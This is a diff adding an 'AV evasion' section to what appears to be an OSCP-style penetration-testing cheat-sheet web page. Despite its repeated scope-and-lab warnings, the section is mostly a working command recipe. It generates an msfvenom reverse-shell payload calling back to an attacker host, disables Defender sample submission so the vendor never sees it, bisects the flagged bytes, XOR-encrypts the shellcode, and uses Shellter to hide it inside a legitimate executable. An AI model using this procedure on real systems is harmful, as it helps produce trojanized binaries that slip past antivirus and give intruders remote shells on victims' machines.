@@ -334,7 +334,7 @@ body.overlay-open{overflow:hidden}
 
 <script>
 const COL={recon:"#38bdf8",web:"#2dd4bf",linux:"#f59e0b",windows:"#60a5fa",
-           ad:"#c084fc",pivot:"#f472b6",bof:"#fb7185",pw:"#a3e635"};
+           ad:"#c084fc",pivot:"#f472b6",bof:"#fb7185",pw:"#a3e635",av:"#94a3b8"};
 
 const TRACKS=[
 /* ============================ RECON ============================ */
@@ -601,6 +601,74 @@ const TRACKS=[
    {d:"Spray one password across many users",c:"nxc smb {IP} -u users.txt -p 'Season2025!' --continue-on-success",l:"Check the lockout policy first. One password per round, not a full brute."},
    {d:"Brute a single service when appropriate",c:"hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} ssh",l:"Reserve online brute for when you must. It is slow and noisy."}
  ],tips:["<b>Always try creds you already have on every service before cracking or brute forcing anything.</b> Reuse is the fastest path.","Feed cracked creds straight back into the AD and lateral-movement tracks."]}
+]},
+
+/* ============================ AV EVASION ============================ */
+{id:"av",name:"AV evasion",colour:COL.av,
+ blurb:"Get a payload past static AV on a lab box you are authorised to test. Build it, find the bytes that are flagged, fix them, hide it inside a real binary, then verify offline.",
+ phases:[
+ {n:0,title:"Test bench",tag:"prep",goal:"A safe, offline place to test before you build anything",steps:[
+   {d:"Confirm the target is in scope",c:"# internal lab, your own VM, or an exam / CTF box you are authorised to attack",
+    l:"Evasion work belongs inside an engagement you have permission for. Keep every payload on the lab network and delete them afterwards."},
+   {d:"Build a scratch Windows VM and snapshot it clean",c:"# Windows 10/11 VM, isolated network, snapshot named 'clean' before any payload lands",
+    l:"Revert to the snapshot between rounds. A quarantine event leaves Defender in a state that makes your next result meaningless."},
+   {d:"Leave Defender real-time protection ON in that VM",c:"Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusSignatureVersion",
+    l:"<b>DefenderCheck and ThreatCheck only work against a live engine</b> — they feed it bytes and watch which ones it bites. With protection disabled they report everything clean and you learn nothing."},
+   {d:"Turn off cloud protection and sample submission BEFORE any payload touches the VM",c:"Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2 -DisableBlockAtFirstSeen $true",
+    l:"<b>Do this first, not after.</b> With cloud protection on, Defender uploads your sample to Microsoft, it is signatured within hours, and every payload built from that template dies with it."},
+   {d:"Never upload a payload to VirusTotal",c:"# VT shares samples with every vendor. Scan offline, in your own VM, always.",
+    l:"One submission burns the payload permanently — for you and for anyone else using the technique. It is the fastest way to waste a day's work."}
+ ],tips:["<b>Scope first.</b> Everything in this track is for labs and authorised tests, not for systems you do not own or have written permission to attack.",
+   "Keep a note of the Defender signature version you tested against. \"It was clean last week\" means nothing after an update."]},
+ {n:1,title:"Build the payload",tag:"attack",goal:"Working shellcode and a listener, proven before you start hiding it",steps:[
+   {d:"Raw x86 shellcode — a plain reverse shell, not meterpreter",c:"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o payload.bin",
+    l:"<b>OSCP note:</b> msfvenom and Shellter are both permitted, but a <i>meterpreter</i> payload spends your single Metasploit allowance. Use <code>shell_reverse_tcp</code> here and keep that allowance for a moment you actually need it. x86 is deliberate — Shellter free cannot take x64."},
+   {d:"Same payload as an EXE, for the detection tools to chew on",c:"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o payload.exe",
+    l:"This raw msfvenom EXE will be flagged instantly. That is the point — it is your baseline for measuring whether the next steps achieve anything."},
+   {d:"Start the listener and prove the payload works with AV off",c:"rlwrap nc -lvnp {LPORT}",
+    l:"Test on a snapshot with protection off first. If it never worked, no amount of evasion will make it work, and you will waste hours blaming the AV."}
+ ],tips:["Fix LHOST and LPORT now. Rebuilding after every evasion round changes the bytes and invalidates your last scan result."]},
+ {n:2,title:"Find what is flagged",tag:"recon",goal:"The exact byte range the engine objects to",steps:[
+   {d:"DefenderCheck — bisects the file against Defender",c:"DefenderCheck.exe payload.exe",
+    l:"Splits the binary in half repeatedly, submits each part to the local engine, and prints the smallest chunk that still trips it. Run it <b>on the Windows VM with real-time protection on</b>; it is useless anywhere else."},
+   {d:"ThreatCheck — same idea, more engines and better output",c:"ThreatCheck.exe -f payload.exe -e Defender",
+    l:"Prints the offending bytes as a hex dump plus the offset. <code>-e AMSI</code> targets the AMSI engine instead, which is what you want for script and in-memory payloads."},
+   {d:"Read what it actually caught",c:"# a string? an import name? the msfvenom decoder stub? the raw shellcode itself?",
+    l:"The answer decides the fix. A flagged <i>string</i> is a five-minute rename. Flagged <i>shellcode</i> means you need encryption and a loader."}
+ ],tips:["Both tools are Windows-only and both need a real engine behind them. There is no Linux shortcut.",
+   "Re-run the check after <b>every</b> change. Blind editing is how a two-hour job becomes two days."]},
+ {n:3,title:"Fix the flagged bytes",tag:"attack",goal:"Change what was caught, re-scan, repeat until clean",steps:[
+   {d:"Rename flagged strings and symbols",c:"# rename functions, variables and any literal the tool pointed at, then rebuild and re-scan",
+    l:"Signatures very often key on a string from a public tool. Renaming it is the cheapest win available."},
+   {d:"Do not rely on msfvenom encoders",c:"# msfvenom -e x86/shikata_ga_nai -i 10   <-- the decoder stub is itself signatured",
+    l:"Encoders were built to dodge bad characters, not AV. Ten iterations of shikata_ga_nai is still a known pattern and gets caught on the stub."},
+   {d:"XOR-encrypt the shellcode and decrypt it in your own loader",c:"# python: enc = bytes(b ^ 0xAA for b in open('payload.bin','rb').read())",
+    l:"Encrypted shellcode is not a signature match on disk. Your loader decrypts it in memory at run time — write it yourself, in C or C#, so the loader is not a known one either."},
+   {d:"Re-scan after each change",c:"ThreatCheck.exe -f loader.exe -e Defender",
+    l:"One change, one scan. If the flagged offset moved but did not disappear, you renamed the symptom, not the cause."}
+ ],tips:["<b>Static clean is not detection-proof.</b> You changed what the file looks like at rest; how it behaves when it runs is a separate problem, covered in the last phase."]},
+ {n:4,title:"Inject into a host PE",tag:"attack",goal:"Hide the payload inside a legitimate executable with Shellter",steps:[
+   {d:"Enable 32-bit Wine, then install Shellter",c:"sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install -y shellter wine32",
+    l:"<b>Shellter free is x86-only</b> and runs under Wine, which is why the i386 architecture has to be added first. Skip <code>--add-architecture</code> and the install fails on missing 32-bit dependencies."},
+   {d:"Grab a genuinely 32-bit host binary to infect",c:"file /path/to/host.exe    # want: PE32 executable (GUI) Intel 80386",
+    l:"It must say PE32, not PE32+. A small standalone utility with no installer and no signature check works best — a signed binary still runs, but its signature is now invalid, which is itself a flag."},
+   {d:"Run Shellter in auto mode against that host",c:"sudo shellter",
+    l:"Choose <b>A</b> for auto, give it the PE path, answer <b>Y</b> to stealth mode (keeps the host's original functionality), then <b>C</b> for custom payload and point it at <code>payload.bin</code>. Listed payloads work too, but custom keeps you off meterpreter."},
+   {d:"If Shellter fails on that PE, try a different one",c:"# 'not a valid PE' / tracing errors are common — pick another 32-bit binary rather than fighting it",
+    l:"Some binaries simply will not take injection. Keep three or four candidate hosts around instead of debugging one."}
+ ],tips:["<b>Shellter defeats static signatures, not behaviour.</b> The file on disk looks like a normal application; the moment it runs and calls out, behavioural detection and any EDR worth the name can still catch it.",
+   "Stealth mode matters: a host binary that no longer does its original job is obvious to anyone who runs it."]},
+ {n:5,title:"Re-verify offline",tag:"post-exploit",goal:"Prove it is clean and still works, without telling any vendor",steps:[
+   {d:"Scan the final binary one more time",c:"ThreatCheck.exe -f host_infected.exe -e Defender",
+    l:"Injection changes the file, so the last scan no longer applies. Clean here means clean against <i>this</i> signature version, nothing more."},
+   {d:"Execute it on the clean snapshot with protection on",c:"# revert to 'clean', copy the binary over, run it, watch your listener",
+    l:"Static clean plus a shell back is the result you want. Static clean and no shell means it was quarantined on execution — a behavioural catch, not a signature one."},
+   {d:"Confirm the host binary still behaves normally",c:"# launch it, use it briefly — it should look and act like the original application",
+    l:"A payload that crashes its host gets noticed by the first person who opens it."},
+   {d:"Revert the snapshot and keep the artefacts on the lab network",c:"# revert VM, delete payloads when the engagement ends",
+    l:"And still no VirusTotal. Not for the loader, not for the injected host, not \"just to check\"."}
+ ],tips:["Re-test after Defender updates. Signature versions move weekly and a payload that was clean on Monday can be flagged by Friday.",
+   "<b>None of this beats EDR.</b> Against behavioural monitoring you need a different approach entirely — this track buys you past static scanning, which on most lab targets is the whole of the defence."]}
 ]}
 ];
 
